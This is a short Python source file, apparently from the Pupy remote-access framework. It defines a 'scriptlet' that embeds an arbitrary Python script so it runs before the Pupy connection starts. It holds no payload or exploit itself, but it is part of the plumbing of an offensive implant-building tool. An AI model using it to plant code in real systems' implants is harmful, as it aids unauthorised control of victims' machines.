#!/usr/bin/env python
# -*- coding: UTF8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

from scriptlets import *

class ScriptletGenerator(Scriptlet):
    """ execute any python script before starting pupy connection ! """
    arguments={
        'path': 'path to the python script to embed'
    }
    def __init__(self, path=None):
        self.script_path=path
        if self.script_path is None:
            raise ScriptletArgumentError("a path to a python script must be supplied")
    dependencies=[]
    def generate(self):
        return open(self.script_path, 'rb').read()


